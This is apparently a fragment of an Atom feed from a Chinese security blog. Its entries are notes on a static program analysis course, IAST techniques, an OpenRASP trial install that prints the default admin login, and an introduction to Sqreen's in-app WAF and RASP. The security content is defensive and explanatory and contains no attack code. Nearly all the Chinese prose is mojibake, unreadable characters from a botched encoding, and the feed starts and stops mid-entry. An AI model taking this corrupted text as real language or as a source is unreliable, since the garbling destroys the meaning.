      &lt;p&gt;æ¯æ ¡è®¡ç®—æœºé™¢çš„ææ¨¾ã€è°­æ·»è€å¸ˆè®²çš„è¯¾ï¼Œå¬äº†ç¬¬ä¸€èŠ‚è¯¾å°±å“­äº†ï¼Œå†³å®šåšä¸€ä¸‹ç¬”è®°ï¼Œè¯¾ç¨‹ç½‘ç«™ &lt;a href=&quot;https://pascal-group.bitbucket.io/teaching.htmlã€‚&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pascal-group.bitbucket.io/teaching.htmlã€‚&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;PLçŸ¥è¯†ä½“ç³»&quot;&gt;&lt;a href=&quot;#PLçŸ¥è¯†ä½“ç³»&quot; class=&quot;headerlink&quot; title=&quot;PLçŸ¥è¯†ä½“ç³»&quot;&gt;&lt;/a&gt;PLçŸ¥è¯†ä½“ç³»&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802113608162.png&quot; alt=&quot;image-20200802113608162&quot;&gt;&lt;/p&gt;&lt;p&gt;å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦åˆ†ä¸‰å¤§å—ï¼Œç†è®ºéƒ¨åˆ†åŒ…å«è¯­è¨€è®¾è®¡ã€ç±»å‹ç³»ç»Ÿã€è¯­ä¹‰å’Œé€»è¾‘æ£€æŸ¥ï¼›ç¯å¢ƒéƒ¨åˆ†åŒ…å«ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶è®¾è®¡ç­‰ï¼›åº”ç”¨éƒ¨åˆ†åŒ…å«ç¨‹åºåˆ†æã€ç¨‹åºéªŒè¯å’Œç¨‹åºç”Ÿæˆç­‰ï¼Œæœ¬è¯¾ç¨‹ä¸»è¦å…³æ³¨äºåº”ç”¨æ–¹é¢çš„ç¨‹åºåˆ†æã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ•°æ®æµåˆ†æ" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•</title>
    <link href="http://anemone.top/iast-%E6%82%AC%E9%95%9C%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    <id>http://anemone.top/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/</id>
    <published>2020-06-14T08:21:52.000Z</published>
    <updated>2020-06-14T09:12:54.574Z</updated>
    
    <content type="html"><![CDATA[<p>æ‚¬é•œçš„ä¸€ä¸ªæŠ€æœ¯åˆ†äº«ä¼šï¼Œå¤§è‡´è®²äº†ä¸‰ç§IASTçš„å®ç°ï¼Œè¿™é‡Œåšä¸€ä¸ªç¬”è®°æ€»ç»“ã€‚</p><h1 id="IASTç®€ä»‹"><a href="#IASTç®€ä»‹" class="headerlink" title="IASTç®€ä»‹"></a>IASTç®€ä»‹</h1><p>IAST (Interactive Application Security Testing) ä¹Ÿå«ç°ç›’æµ‹è¯•ï¼Œå³ä»‹äºç™½ç›’å’Œé»‘ç›’ä¹‹é—´çš„ä¸€ç§æµ‹è¯•ï¼Œè¿™ä¸€åœºæ™¯ä¸‹çš„æŠ€æœ¯ä¸ä½†å…³æ³¨ç¨‹åºè¾“å…¥è¾“å‡ºä¿¡æ¯ï¼ˆåƒé»‘ç›’ç¨‹åºé‚£æ ·ï¼‰ï¼Œè¿˜å¯ä»¥ï¼ˆæ³¨æ„åªæ˜¯å¯ä»¥ï¼Œåé¢ä¼šç»†è¯´ï¼‰äº†è§£éƒ¨åˆ†ç¨‹åºå†…éƒ¨é€»è¾‘ï¼ˆåƒç™½ç›’æµ‹è¯•é‚£æ ·ï¼‰ã€‚å› æ­¤å…·å¤‡é»‘ç™½ç›’æµ‹è¯•çš„ä¼˜ç‚¹ï¼Œè¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€ä»£å®‰å…¨æ‰«ææŠ€æœ¯ï¼Œè¢«å„ä¸ªè¡Œä¸šæ‰€å…³æ³¨ã€‚è®¸å¤šé»‘ç™½ç›’æµ‹è¯•æŠ€æœ¯ç¨åŠ æ”¹é€ å’Œç»“åˆï¼Œå°±å¯ä»¥å˜ä¸ºç°ç›’æµ‹è¯•æŠ€æœ¯ã€‚</p><a id="more"></a><p><img src="/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/InkedImage-1592125628662_LI.jpg" alt="Image"></p><h2 id="ä¸RASPçš„å…³ç³»"><a href="#ä¸RASPçš„å…³ç³»" class="headerlink" title="ä¸RASPçš„å…³ç³»"></a>ä¸RASPçš„å…³ç³»</h2><p>RASPï¼ˆRuntime Application Self-protectionï¼‰æ˜¯æŒ‡åœ¨ç¨‹åºè¿è¡Œæ—¶å¯¹ç¨‹åºè¡Œä¸ºè¿›è¡Œä¿æŠ¤ï¼Œå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç²¾ç¡®åˆ°å‡½æ•°çº§åˆ«çš„WAFï¼Œä¸ªäººè®¤ä¸ºRASPæ˜¯IASTçš„ä¸€éƒ¨åˆ†ï¼Œä¸¤è€…ä½¿ç”¨çš„æŠ€æœ¯æ˜¯æœ‰é‡å çš„ï¼Œæ¯”å¦‚è¯´åæ–‡æåˆ°çš„åŸºäºæ’æ¡©çš„IASTå®ç°ã€‚</p><h1 id="IASTåˆ†ç±»"><a href="#IASTåˆ†ç±»" class="headerlink" title="IASTåˆ†ç±»"></a>IASTåˆ†ç±»</h1><p>åœ¨å¤§æ–¹å‘ä¸Šï¼Œä¸»è¦æœ‰ä¸¤ç§ï¼Œè€Œåœ¨æ’æ¡©æŠ€æœ¯å®ç°æ—¶åˆä¼šæœ‰åˆ†æ”¯ï¼š</p><ul><li>åŸºäºæµé‡</li><li>åŸºäºæ’æ¡©<ul><li>ä¸»åŠ¨å‹IAST</li><li>è¢«åŠ¨å‹IAST</li></ul></li></ul><h2 id="åŸºäºæµé‡çš„IAST"><a href="#åŸºäºæµé‡çš„IAST" class="headerlink" title="åŸºäºæµé‡çš„IAST"></a>åŸºäºæµé‡çš„IAST</h2><p>åŸºäºæµé‡çš„IASTæ˜¯æŒ‡é€šè¿‡çˆ¬è™«+è¢«åŠ¨å¼é»‘ç›’æ‰«æå™¨å®ç°çš„IASTæŠ€æœ¯ï¼Œæ¯”å¦‚è¯´crawlergo+xrayçš„é…ç½®ï¼Œè¿™ç±»æŠ€æœ¯çš„ä¸»è¦ä¼˜åŠ¿åœ¨äºï¼š</p><ol><li><p>åŸºäºç°æˆæŠ€æœ¯ï¼Œæ”¹é€ ç®€å•</p></li><li><p>ä¸é™è¯­è¨€ï¼ŒæŠ€æœ¯é€šç”¨</p></li><li><p>æ‰«ææŠ¥å‘Šå¯ä»¥ç›´æ¥ç”¨äºæ¼æ´éªŒè¯å’Œåˆ©ç”¨</p></li><li><p>ç›¸è¾ƒäºæ’æ¡©èƒ½æ‰«ææ›´å¤šç±»å‹æ¼æ´ï¼ˆå¦‚BACï¼‰</p></li></ol><h2 id="åŸºäºæ’æ¡©çš„IAST"><a href="#åŸºäºæ’æ¡©çš„IAST" class="headerlink" title="åŸºäºæ’æ¡©çš„IAST"></a>åŸºäºæ’æ¡©çš„IAST</h2><p>åŸºäºæ’æ¡©çš„IASTä¸»è¦æ˜¯åˆ©ç”¨ä»£ç æ’æ¡©æŠ€æœ¯ï¼Œåœ¨ç›®æ ‡åº”ç”¨çš„å…³é”®ç±»ã€æ–¹æ³•ä¸­æ’å…¥æ£€æµ‹é€»è¾‘ï¼Œå¦‚åœ¨Javaä¸­ï¼Œå¯ä»¥ç”¨å­—èŠ‚ç æ“ä½œæ¡†æ¶ï¼ˆå¦‚ï¼šASMã€Javaassistã€Aspectjç­‰ï¼‰ä¿®æ”¹ç±»å’Œæ–¹æ³•ï¼Œé€šè¿‡ç¨‹åºåé¦ˆæ£€æµ‹ç¨‹åºæ¼æ´ï¼Œè¿™ç±»æŠ€æœ¯çš„ä¼˜åŠ¿åœ¨äºï¼š</p><ol><li>æ— éœ€é‡æ”¾ã€æ— è„æ•°æ®</li><li>æ›´é«˜çš„å‡†ç¡®æ€§</li><li>è§£å†³ç­¾åæ ¡éªŒã€é™åˆ¶æ•°æ®é‡æ”¾ç­‰é—®é¢˜</li></ol><h3 id="ä¸»åŠ¨å‹IAST"><a href="#ä¸»åŠ¨å‹IAST" class="headerlink" title="ä¸»åŠ¨å‹IAST"></a>ä¸»åŠ¨å‹IAST</h3><p>ä¸»åŠ¨å‹IASTæ˜¯æŒ‡ä»ç„¶ä¿ç•™é»‘ç›’æ‰«æå™¨ï¼Œåªåœ¨å®‰å…¨æ•æ„Ÿå‡½æ•°ï¼ˆæ±¡ç‚¹åˆ†æä¸­çš„sink ï¼‰ä¸Šæ’æ¡©ï¼Œé€šè¿‡æ£€æµ‹å‡½æ•°å‚æ•°æ˜¯å¦æ˜¯é¢„å®šä¹‰çš„payloadï¼Œæ£€æŸ¥ç¨‹åºæ˜¯å¦æœ‰æ¼æ´ï¼Œå¦‚ä¸‹å›¾ï¼Œagentç«¯å¯ä»¥æ£€æµ‹åˆ°æ‰«æå™¨å‘æ¥çš„payloadå·²ç»ä½œä¸º<code>executeQuery()</code>çš„å‚æ•°ï¼Œå› æ­¤æŠ¥å‘Šæ¼æ´ï¼Œæˆ–æ˜¯æ‹¦æˆªï¼ˆRASPï¼‰ã€‚æ’æ¡©ç¨‹åºå¯ä»¥åŒæ—¶æ‹¿åˆ°è¿”å›å‡½æ•°è°ƒç”¨æ ˆã€ä»£ç è¡Œå·ä»¥åŠè¯·æ±‚æ•°æ®ã€‚</p><p><img src="/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/Image.png" alt="ä¸»åŠ¨å‹IAST"></p><h3 id="è¢«åŠ¨å‹IAST"><a href="#è¢«åŠ¨å‹IAST" class="headerlink" title="è¢«åŠ¨å‹IAST"></a>è¢«åŠ¨å‹IAST</h3><p>è¢«åŠ¨å‹IASTæ˜¯æŒ‡ä½¿ç”¨åŠ¨æ€æ±¡ç‚¹åˆ†ææŠ€æœ¯ï¼Œä¸éœ€è¦æ‰«æç«¯ï¼Œç›´æ¥åˆ¤æ–­æ•æ„Ÿå‚æ•°æ˜¯å¦ä¸ºç”¨æˆ·å¯æ§ã€‚ä¸ªäººè®¤ä¸ºæ˜¯æŠ€æœ¯éš¾åº¦æœ€é«˜çš„ä¸€ç§IASTï¼Œå› ä¸ºæ’æ¡©ç¨‹åºéœ€è¦å®ç°åŠ¨æ€æ±¡ç‚¹åˆ†æé€»è¾‘ï¼Œå®æ—¶ç›‘æ§ç¨‹åºæ±¡ç‚¹æ•°æ®å˜åŒ–ï¼Œæ£€æµ‹æ±¡ç‚¹æ˜¯å¦ç”±sourceä¼ æ’­åˆ°sinkç‚¹ã€‚</p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé€šè¿‡æ±¡ç‚¹åˆ†æï¼Œç”¨æˆ·äº§ç”Ÿçš„è¾“å…¥å¯ä»¥ç›´æ¥äº§ç”Ÿæ¼æ´æŠ¥å‘Šï¼š</p><p><img src="/iast-æ‚¬é•œæŠ€æœ¯åˆ†äº«ç¬”è®°â€”â€”ç°ç›’æµ‹è¯•/Image-1592125395631.png" alt="è¢«åŠ¨å‹IAST"></p><p>è¢«åŠ¨å‹IASTçš„å¥½å¤„åœ¨äºå…¶å®Œå…¨ä¸ä¼šå½±å“æ­£å¸¸ä¸šåŠ¡ï¼Œå¹¶ä¸”å¤§å¤§æé«˜æ‰«æè¦†ç›–ç‡ï¼Œç„¶è€Œä¸ªäººè®¤ä¸ºåŠ¨æ€æ±¡ç‚¹ä¼ æ’­ä¹Ÿä¼šæœ‰è¿‡æ±¡æŸ“å’Œæ¬ æ±¡æŸ“é—®é¢˜ï¼Œå¹¶ä¸”å…¶æœ¬èº«å¹¶ä¸èƒ½å¾ˆå¥½çš„å¤„ç†åˆ†æ”¯è¦†ç›–é—®é¢˜ï¼Œå¯ä»¥è¯´åœ¨è¿™ä¸€æ–¹é¢è¿˜å­˜åœ¨ç€è¯¸å¤šæŒ‘æˆ˜ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åˆ†äº«ä¼šå› ä¸ºæœ‰äº›æ¶‰åŠåˆ°æŠ€æœ¯ç»†èŠ‚ï¼Œå¤§ä½¬è¿˜æ˜¯æœ‰æ‰€ä¿ç•™ï¼Œä¸è¿‡å¤§è‡´ç†æ¸…æ¥šäº†IASTçš„ä¸‰å¤§å·¥ä½œæ¨¡å¼å’Œå¯¹åº”çš„æŠ€æœ¯ï¼Œç®—æ˜¯ä¸€æ¬¡ç§‘æ™®æ€§çš„åˆ†äº«ï¼Œæ„Ÿè°¢å®æˆˆå¤§ä½¬ï¼</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‚¬é•œçš„ä¸€ä¸ªæŠ€æœ¯åˆ†äº«ä¼šï¼Œå¤§è‡´è®²äº†ä¸‰ç§IASTçš„å®ç°ï¼Œè¿™é‡Œåšä¸€ä¸ªç¬”è®°æ€»ç»“ã€‚&lt;/p&gt;&lt;h1 id=&quot;IASTç®€ä»‹&quot;&gt;&lt;a href=&quot;#IASTç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;IASTç®€ä»‹&quot;&gt;&lt;/a&gt;IASTç®€ä»‹&lt;/h1&gt;&lt;p&gt;IAST (Interactive Application Security Testing) ä¹Ÿå«ç°ç›’æµ‹è¯•ï¼Œå³ä»‹äºç™½ç›’å’Œé»‘ç›’ä¹‹é—´çš„ä¸€ç§æµ‹è¯•ï¼Œè¿™ä¸€åœºæ™¯ä¸‹çš„æŠ€æœ¯ä¸ä½†å…³æ³¨ç¨‹åºè¾“å…¥è¾“å‡ºä¿¡æ¯ï¼ˆåƒé»‘ç›’ç¨‹åºé‚£æ ·ï¼‰ï¼Œè¿˜å¯ä»¥ï¼ˆæ³¨æ„åªæ˜¯å¯ä»¥ï¼Œåé¢ä¼šç»†è¯´ï¼‰äº†è§£éƒ¨åˆ†ç¨‹åºå†…éƒ¨é€»è¾‘ï¼ˆåƒç™½ç›’æµ‹è¯•é‚£æ ·ï¼‰ã€‚å› æ­¤å…·å¤‡é»‘ç™½ç›’æµ‹è¯•çš„ä¼˜ç‚¹ï¼Œè¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€ä»£å®‰å…¨æ‰«ææŠ€æœ¯ï¼Œè¢«å„ä¸ªè¡Œä¸šæ‰€å…³æ³¨ã€‚è®¸å¤šé»‘ç™½ç›’æµ‹è¯•æŠ€æœ¯ç¨åŠ æ”¹é€ å’Œç»“åˆï¼Œå°±å¯ä»¥å˜ä¸ºç°ç›’æµ‹è¯•æŠ€æœ¯ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="IAST" scheme="http://anemone.top/categories/IAST/"/>
    
    
      <category term="IAST" scheme="http://anemone.top/tags/IAST/"/>
    
      <category term="RASP" scheme="http://anemone.top/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASPåˆæ¢</title>
    <link href="http://anemone.top/iast-OpenRASP%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/iast-OpenRASPåˆæ¢/</id>
    <published>2020-06-14T08:17:12.000Z</published>
    <updated>2020-06-29T09:07:15.622Z</updated>
    
    <content type="html"><![CDATA[<p>OpenRASPæ˜¯ä¸€ç§è¾ƒä¸ºæˆç†Ÿçš„RASPæŠ€æœ¯å¼€æºå®ç°ï¼ŒæŠ€æœ¯æ€è·¯ä¸»è¦æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« ä¸­çš„ä¸»åŠ¨å‹RASPåŸç†ï¼Œè¯¦ç»†å¯ä»¥è§<a href="https://rasp.baidu.com/doc/hacking/architect/hook.html?from=openrasp_internals" target="_blank" rel="noopener">hookå‡½æ•°åˆ—è¡¨</a>ï¼ˆå•†ä¸šç‰ˆæœ‰åŠ¨æ€æ±¡ç‚¹è¿½è¸ªï¼‰ï¼Œæœ¬æ–‡ä¸ºè¯•ç”¨æŠ¥å‘Šï¼Œä¹‹åæœ‰æ—¶é—´ä¼šæ·±å…¥çœ‹çœ‹ä»£ç ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><h2 id="å®‰è£…åå°"><a href="#å®‰è£…åå°" class="headerlink" title="å®‰è£…åå°"></a>å®‰è£…åå°</h2><ol><li><p>å®‰è£…MongoDBå’ŒElasticSearchï¼ˆ5.6~6ï¼‰</p></li><li><p>åœ¨<a href="https://packages.baidu.com/app/openrasp/release/latest/" target="_blank" rel="noopener">https://packages.baidu.com/app/openrasp/release/latest/</a>ä¸‹è½½<code>rasp-cloud.tar.gz</code></p></li><li><p>è§£å‹å¹¶é…ç½®<code>conf/app.conf</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[prod]</span><br><span class="line">EsAddr = http://127.0.0.1:9200</span><br><span class="line">EsUser =</span><br><span class="line">EsPwd =</span><br><span class="line">MongoDBAddr = 127.0.0.1:27017</span><br><span class="line">MongoDBUser =</span><br><span class="line">MongoDBPwd =</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨<code>./rasp-cloud -d</code>ï¼Œç”¨æˆ·åå¯†ç ä¸º<code>openrasp::admin@123</code>ï¼Œåå°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/iast-OpenRASPåˆæ¢/image-20200629161638149.png" alt="image-20200629161638149"></p></li></ol><a id="more"></a><h2 id="å®‰è£…agent"><a href="#å®‰è£…agent" class="headerlink" title="å®‰è£…agent"></a>å®‰è£…agent</h2><p>è¿™é‡Œåªä½¿ç”¨Spring Bootçš„ç”¨æ³•ï¼š</p><ol><li><p>åŠè‡ªåŠ¨åŒ–å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar RaspInstall.jar -nodetect -install &lt;project_target&gt;  -heartbeat 90 -appid &lt;id&gt; -appsecret &lt;secret&gt; -backendurl &lt;url&gt;</span><br></pre></td></tr></table></figure></li><li><p>é‡å¯Spring Boot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/mnt/d/java-sec-code/target/rasp/rasp.jar  -jar /mnt/d/java-sec-code/target/java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸»æœºä¸Šçº¿ï¼š</p><p><img src="/iast-OpenRASPåˆæ¢/image-20200629165551559.png" alt="image-20200629165551559"></p></li></ol><h1 id="åŠŸèƒ½ä½¿ç”¨"><a href="#åŠŸèƒ½ä½¿ç”¨" class="headerlink" title="åŠŸèƒ½ä½¿ç”¨"></a>åŠŸèƒ½ä½¿ç”¨</h1><p>ä¸»è¦æ‹¿Java-sec-codeè¯•ç”¨äº†ä¸€ä¸‹ï¼Œæ•ˆæœè¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œé™¤äº†ä¸€ä¸ªPathTraversalæ²¡æ£€æŸ¥å‡ºæ¥ï¼Œå…¶ä»–çš„éƒ½æŸ¥åˆ°äº†ï¼š</p><p><img src="/iast-OpenRASPåˆæ¢/image-20200629170641757.png" alt="image-20200629170641757"></p><p>è‡³äºé‚£ä¸ªpathtranversalæ²¡æŸ¥å‡ºæ¥çš„é—®é¢˜åé¢å¯ä»¥å†çœ‹ä¸€ä¸‹ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li>OpenRASPå®˜ç½‘ï¼Œ<a href="https://rasp.baidu.com/" target="_blank" rel="noopener">https://rasp.baidu.com/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;OpenRASPæ˜¯ä¸€ç§è¾ƒä¸ºæˆç†Ÿçš„RASPæŠ€æœ¯å¼€æºå®ç°ï¼ŒæŠ€æœ¯æ€è·¯ä¸»è¦æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« ä¸­çš„ä¸»åŠ¨å‹RASPåŸç†ï¼Œè¯¦ç»†å¯ä»¥è§&lt;a href=&quot;https://rasp.baidu.com/doc/hacking/architect/hook.html?from=openrasp_internals&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hookå‡½æ•°åˆ—è¡¨&lt;/a&gt;ï¼ˆå•†ä¸šç‰ˆæœ‰åŠ¨æ€æ±¡ç‚¹è¿½è¸ªï¼‰ï¼Œæœ¬æ–‡ä¸ºè¯•ç”¨æŠ¥å‘Šï¼Œä¹‹åæœ‰æ—¶é—´ä¼šæ·±å…¥çœ‹çœ‹ä»£ç ã€‚&lt;/p&gt;&lt;h1 id=&quot;å®‰è£…&quot;&gt;&lt;a href=&quot;#å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…&quot;&gt;&lt;/a&gt;å®‰è£…&lt;/h1&gt;&lt;h2 id=&quot;å®‰è£…åå°&quot;&gt;&lt;a href=&quot;#å®‰è£…åå°&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…åå°&quot;&gt;&lt;/a&gt;å®‰è£…åå°&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;å®‰è£…MongoDBå’ŒElasticSearchï¼ˆ5.6~6ï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;åœ¨&lt;a href=&quot;https://packages.baidu.com/app/openrasp/release/latest/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://packages.baidu.com/app/openrasp/release/latest/&lt;/a&gt;ä¸‹è½½&lt;code&gt;rasp-cloud.tar.gz&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è§£å‹å¹¶é…ç½®&lt;code&gt;conf/app.conf&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[prod]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EsAddr = http://127.0.0.1:9200&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EsUser =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EsPwd =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MongoDBAddr = 127.0.0.1:27017&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MongoDBUser =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MongoDBPwd =&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¯åŠ¨&lt;code&gt;./rasp-cloud -d&lt;/code&gt;ï¼Œç”¨æˆ·åå¯†ç ä¸º&lt;code&gt;openrasp::admin@123&lt;/code&gt;ï¼Œåå°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/iast-OpenRASPåˆæ¢/image-20200629161638149.png&quot; alt=&quot;image-20200629161638149&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="IAST" scheme="http://anemone.top/categories/IAST/"/>
    
    
      <category term="IAST" scheme="http://anemone.top/tags/IAST/"/>
    
      <category term="RASP" scheme="http://anemone.top/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>Sqreenåˆæ¢</title>
    <link href="http://anemone.top/iast-Sqreen%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/iast-Sqreenåˆæ¢/</id>
    <published>2020-06-04T08:37:37.000Z</published>
    <updated>2020-06-05T03:06:12.004Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.sqreen.com/" target="_blank" rel="noopener">Sqreen</a> ä½œä¸ºä¸€æ¬¾IASTäº§å“ï¼Œç”¨æˆ·åœ¨é¡¹ç›®ä¸­å¯¼å…¥ä»–ä»¬çš„agentï¼Œä¹‹åå¯åœ¨æ§åˆ¶å°æŸ¥çœ‹æ£€æµ‹åˆ°çš„å®‰å…¨é£é™©ï¼Œå¹¶è¿›è¡Œé˜²å¾¡ï¼ˆRASPï¼‰ã€‚</p><h1 id="æŠ€æœ¯ä»‹ç»"><a href="#æŠ€æœ¯ä»‹ç»" class="headerlink" title="æŠ€æœ¯ä»‹ç»"></a>æŠ€æœ¯ä»‹ç»</h1><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒSqreenä¸»è¦ç”±ä¸‰ä¸ªç»„ä»¶ç»„æˆï¼ŒMicroAgentã€Security Engineå’ŒSqreen Platformï¼ŒSecurity Engineéƒ¨ç½²äºMicroAgentå†…éƒ¨ï¼Œå¼€å‘è€…åªè¦åœ¨å¯åŠ¨åº”ç”¨æ—¶å€’å…¥MicroAgentå³å¯ï¼ŒPlatformä¸»è¦ç”¨äºæ¥æ”¶Agentä¿¡æ¯å¹¶ä¸”å¯è§†åŒ–ç»™ç”¨æˆ·ã€‚</p><a id="more"></a><p><img src="/iast-Sqreenåˆæ¢/how-it-works-together-1.png" alt="img"></p><p>å¯è§MicroAgentæ˜¯å…¶ä¸»è¦éƒ¨ä»¶ï¼Œä¸»è¦æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ul><li>åŠ¨æ€æ’æ¡©</li><li>ç›‘æ§ç¨‹åºå¹¶æ”¶é›†ä¿¡æ¯</li><li>æ ¹æ®å®‰å…¨å¼•æ“æŒ‡ç¤ºæ‰§è¡Œå®‰å…¨å“åº”</li><li>ä¸Platformé€šä¿¡</li></ul><h1 id="é˜²å¾¡æŠ€æœ¯"><a href="#é˜²å¾¡æŠ€æœ¯" class="headerlink" title="é˜²å¾¡æŠ€æœ¯"></a>é˜²å¾¡æŠ€æœ¯</h1><p>ä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°Sqreenä½¿ç”¨å¤šå±‚æ¬¡ä¿æŠ¤åº”ç”¨ç¨‹åºï¼Œè¿™é‡Œä¸»è¦ä»‹ç»In-App WAF å’Œ RASPã€‚</p><p><img src="/iast-Sqreenåˆæ¢/defense-in-depth.png" alt="img"></p><h2 id="In-App-WAF"><a href="#In-App-WAF" class="headerlink" title="In-App WAF"></a>In-App WAF</h2><p>åº”ç”¨å†…WAFæ˜¯ç¬¬ä¸€é“é˜²çº¿ï¼Œå’Œå¤–éƒ¨é˜²ç«å¢™ä¸€æ ·ï¼Œä¸»è¦é€šè¿‡æ¨¡å¼åŒ¹é…æ¥æ£€æµ‹å’Œé˜»æ­¢æ¶æ„æµé‡ï¼Œä½†ä¸å¤–éƒ¨WAFä¸åŒçš„æ˜¯ï¼Œåº”ç”¨å†…WAFå¯ä»¥æ ¹æ®å½“å‰åº”ç”¨çš„æ•°æ®åº“ã€æ¡†æ¶å’Œç¼–ç¨‹è¯­è¨€åº”ç”¨ä¸åŒçš„è§„åˆ™ï¼Œæé«˜æ•ˆç‡ã€‚</p><p>å¦‚ä¸‹å›¾ï¼Œåœ¨æ–°å»ºä¸€ä¸ªè§„åˆ™æ—¶ï¼Œå¯ä»¥é€‰æ‹©åŒ¹é…æŠ¥æ–‡çš„å“ªäº›å­—æ®µï¼ˆå…¶å®æ„Ÿè§‰è·Ÿå¤–éƒ¨WAFä¸€æ ·ï¼‰</p><p><img src="/iast-Sqreenåˆæ¢/image-20200604191023036.png" 